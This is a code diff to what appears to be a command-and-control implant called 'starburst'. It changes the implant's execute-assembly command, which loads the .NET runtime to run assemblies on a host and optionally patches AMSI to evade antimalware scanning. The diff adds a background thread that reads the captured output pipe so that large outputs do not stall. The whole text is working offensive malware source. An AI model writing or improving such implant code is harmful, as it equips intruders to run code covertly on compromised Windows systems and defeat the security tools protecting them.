@@ -104,6 +104,70 @@ struct ICorRuntimeHost {
     } *lpVtbl;
 };
 
+struct PipeReaderCtx {
+    instance*     inst;
+    HANDLE        h_pipe_read;
+    uint8_t*      output_buf;
+    uint32_t      output_len;
+    uint32_t      output_cap;
+    volatile LONG done;
+};
+
+static auto WINAPI declfn pipe_reader_fn( LPVOID param ) -> DWORD {
+    auto ctx  = static_cast<PipeReaderCtx*>( param );
+    auto& inst = *ctx->inst;
+
+    DWORD available = 0;
+    DWORD bytes_read = 0;
+
+    while ( !ctx->done ) {
+        available = 0;
+        if ( !inst.kernel32.PeekNamedPipe( ctx->h_pipe_read,
+                nullptr, 0, nullptr, &available, nullptr ) )
+            break;
+
+        if ( available > 0 ) {
+            if ( ctx->output_len + available > ctx->output_cap ) {
+                uint32_t new_cap = ctx->output_cap == 0 ? 4096 : ctx->output_cap;
+                while ( new_cap < ctx->output_len + available + 1 ) new_cap *= 2;
+                ctx->output_buf = static_cast<uint8_t*>(
+                    inst.heap_realloc( ctx->output_buf, new_cap ) );
+                ctx->output_cap = new_cap;
+            }
+            bytes_read = 0;
+            inst.kernel32.ReadFile( ctx->h_pipe_read,
+                ctx->output_buf + ctx->output_len,
+                available, &bytes_read, nullptr );
+            ctx->output_len += bytes_read;
+        } else {
+            inst.kernel32.Sleep( 10 );
+        }
+    }
+
+    while ( true ) {
+        available = 0;
+        if ( !inst.kernel32.PeekNamedPipe( ctx->h_pipe_read,
+                nullptr, 0, nullptr, &available, nullptr ) )
+            break;
+        if ( available == 0 ) break;
+
+        if ( ctx->output_len + available > ctx->output_cap ) {
+            uint32_t new_cap = ctx->output_cap == 0 ? 4096 : ctx->output_cap;
+            while ( new_cap < ctx->output_len + available + 1 ) new_cap *= 2;
+            ctx->output_buf = static_cast<uint8_t*>(
+                inst.heap_realloc( ctx->output_buf, new_cap ) );
+            ctx->output_cap = new_cap;
+        }
+        bytes_read = 0;
+        inst.kernel32.ReadFile( ctx->h_pipe_read,
+            ctx->output_buf + ctx->output_len,
+            available, &bytes_read, nullptr );
+        ctx->output_len += bytes_read;
+    }
+
+    return 0;
+}
+
 auto declfn starburst::cmd_execute_assembly(
     _Inout_ instance& inst,
     _In_    char*     task_uuid,
@@ -463,6 +527,16 @@ auto declfn starburst::cmd_execute_assembly(
     VARIANT v_result;
     memory::zero( &v_result, sizeof( VARIANT ) );
 
+    PipeReaderCtx reader_ctx = {};
+    reader_ctx.inst        = &inst;
+    reader_ctx.h_pipe_read = h_pipe_read;
+    reader_ctx.done        = 0;
+
+    HANDLE h_reader = inst.kernel32.CreateThread(
+        nullptr, 0,
+        reinterpret_cast<LPTHREAD_START_ROUTINE>( pipe_reader_fn ),
+        &reader_ctx, 0, nullptr );
+
     #if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
         evasion_patch_amsi( inst );
     #endif
@@ -474,31 +548,14 @@ auto declfn starburst::cmd_execute_assembly(
     hr = pInvoke3( method_info, v_obj, sa_params_invoke, &v_result );
     DBG_PRINT( inst, "execute_assembly Invoke_3 hr=0x%08x\n", hr );
 
-    // Read captured output
-    uint8_t* output_buf = nullptr;
-    uint32_t output_len = 0;
-    uint32_t output_cap = 0;
-    DWORD available = 0;
-    DWORD bytes_read = 0;
-
-    while ( true ) {
-        if ( !inst.kernel32.PeekNamedPipe( h_pipe_read,
-                nullptr, 0, nullptr, &available, nullptr ) )
-            break;
-        if ( available == 0 ) break;
-
-        if ( output_len + available > output_cap ) {
-            uint32_t new_cap = output_cap == 0 ? 4096 : output_cap;
-            while ( new_cap < output_len + available ) new_cap *= 2;
-            output_buf = static_cast<uint8_t*>( inst.heap_realloc( output_buf, new_cap ) );
-            output_cap = new_cap;
-        }
-
-        bytes_read = 0;
-        inst.kernel32.ReadFile( h_pipe_read,
-            output_buf + output_len, available, &bytes_read, nullptr );
-        output_len += bytes_read;
+    reader_ctx.done = 1;
+    if ( h_reader ) {
+        inst.kernel32.WaitForSingleObject( h_reader, 5000 );
+        inst.kernel32.CloseHandle( h_reader );
     }
+
+    uint8_t* output_buf = reader_ctx.output_buf;
+    uint32_t output_len = reader_ctx.output_len;
 
 #ifndef INCLUDE_CMD_POWERPICK
     inst.kernel32.CloseHandle( h_pipe_write );
